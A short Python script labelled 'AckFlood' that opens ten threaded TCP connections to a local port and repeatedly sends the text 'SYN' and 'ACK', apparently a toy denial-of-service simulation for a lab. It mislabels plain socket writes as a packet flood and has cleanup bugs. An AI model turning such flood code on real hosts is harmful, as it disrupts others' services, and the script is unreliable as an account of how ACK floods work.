import socket
import threading
import time

class AckFlood:
    def __init__(self):                
        self.target_ip = '127.0.0.1'
        self.target_port = 9999
        self.connections = []
        self.running = False
        self.packets = 10

    def attack(self, conn_id):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)  
            sock.connect((self.target_ip, self.target_port))
            sock.send(b'SYN')

            data = sock.recv(1024)
            if data != b"SYN-ACK":
                sock.close()
                return

            while(self.running):
                sock.send(b'ACK')
                time.sleep(0.75)
                print(f"[AckFlood {conn_id}] Sent ACK")
        except Exception as e:
            print(f"[AckFlood {conn_id}] Error: {e}")
            if sock in self.connections:
                self.connections.remove(sock)

    def start_attack(self, num_connections=10):
        print(f"[AckFlood] Starting attack on {self.target_ip}:{self.target_port}")
        print(f"[AckFlood] Creating {num_connections} flood connections...")
        self.running = True
        threads = []
        
        for i in range(num_connections):
            t = threading.Thread(target=self.attack, args=(i+1,))
            t.daemon = True
            t.start()
            threads.append(t)
            time.sleep(0.25)
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[AckFlood] Stopping attack...")
        finally:
            self.stop_attack()

    def stop_attack(self):
        self.running = False
        print("[AckFlood] Closing connections...")     
        for sock in self.connections:
            try:
                sock.close()
            except:
                pass     
        self.connections.clear()
        print("[AckFlood] Attack stopped")


if __name__ == "__main__":
    attack = AckFlood()
    try:
        attack.start_attack()
    except KeyboardInterrupt:
        attack.stop_attack()